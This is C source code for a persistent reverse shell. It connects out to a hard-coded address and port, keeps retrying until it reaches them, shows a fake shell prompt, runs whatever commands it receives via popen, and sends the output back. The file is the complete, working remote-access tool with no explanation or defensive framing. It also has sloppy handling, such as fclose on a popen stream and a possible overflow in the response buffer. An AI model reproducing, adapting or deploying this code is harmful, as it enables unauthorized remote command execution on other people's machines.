#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <string.h>

int sock;
char sh[32];

void getuname(){
	char name[32];
	memset(&name , 0 , sizeof(name));
	memset(&sh , 0 , sizeof(sh));

	FILE *fp = popen("whoami" , "r");
	fgets(name , sizeof(name) , fp);
	strtok(name , "\n");

	strcat(sh , "shell@");
	strcat(sh , name);
	strcat(sh , ":~$ ");
	fclose(fp);
}


char *strcut(char *str){
	char *buffer;
	buffer = &str[3];
	return buffer;
}

void shell(){

	char buffer[1024];
	char container[1024];
	char total_response[18384];

	getuname();

	while(1){
		memset(&buffer , 0 , sizeof(buffer));
		memset(&container , 0 ,sizeof(buffer));
		memset(&total_response , 0 , sizeof(total_response));

		send(sock , sh , sizeof(sh) , 0);
		recv(sock , buffer , sizeof(buffer) , 0);
		strtok(buffer , "\n");


		if(strncmp(buffer , "q" , 1) == 0){
			close(sock);
			break;
		}
		else if(strncmp(buffer , "cd " , 3) == 0){
			chdir(strcut(buffer));
		}
		else{
			FILE *fp;
			fp = popen(buffer , "r");
			while(fgets(container ,sizeof(container) , fp) != NULL){
				strcat(total_response, container);
			}
			send(sock , total_response , sizeof(total_response), 0);
			fclose(fp);
		}
	}
}


int main(){

	char *ip = "127.0.0.1";
	unsigned short port = 1337;

	struct sockaddr_in host;
	memset(&host , 0 , sizeof(host));
	host.sin_family = AF_INET;
	host.sin_addr.s_addr = inet_addr(ip);
	host.sin_port = htons(port);

	back:
	sock = socket(AF_INET , SOCK_STREAM , 0);

	start:
	while(connect(sock , (struct sockaddr*) &host , sizeof(host)) != 0){
		sleep(10);
		goto start;
	}
	shell();
	goto back;
	return 0;
}
